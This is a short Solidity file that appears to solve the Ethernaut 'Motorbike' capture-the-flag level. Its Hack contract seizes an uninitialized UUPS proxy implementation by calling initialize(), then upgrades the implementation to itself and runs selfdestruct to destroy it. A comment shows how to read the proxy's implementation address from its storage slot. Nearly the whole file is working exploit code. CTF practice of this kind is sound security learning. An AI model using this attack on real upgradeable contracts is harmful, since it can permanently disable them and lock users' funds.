pragma solidity ^0.8;

interface IMotorbike {
    function upgrader() external view returns (address);
    function horsePower() external view returns (uint256);
}

interface IEngine {
    function initialize() external;
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable;
}

// Get implementation
// await web3.eth.getStorageAt(contract.address, '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc')
// 0x0000000000000000000000002c61fbf57208d2b3234d1383d84388a77c251bc5

contract Hack {
    function pwn(IEngine target) external {
        target.initialize();
        target.upgradeToAndCall(address(this), abi.encodeWithSelector(this.kill.selector));
    }

    function kill() external {
        selfdestruct(payable(address(0)));
    }
}
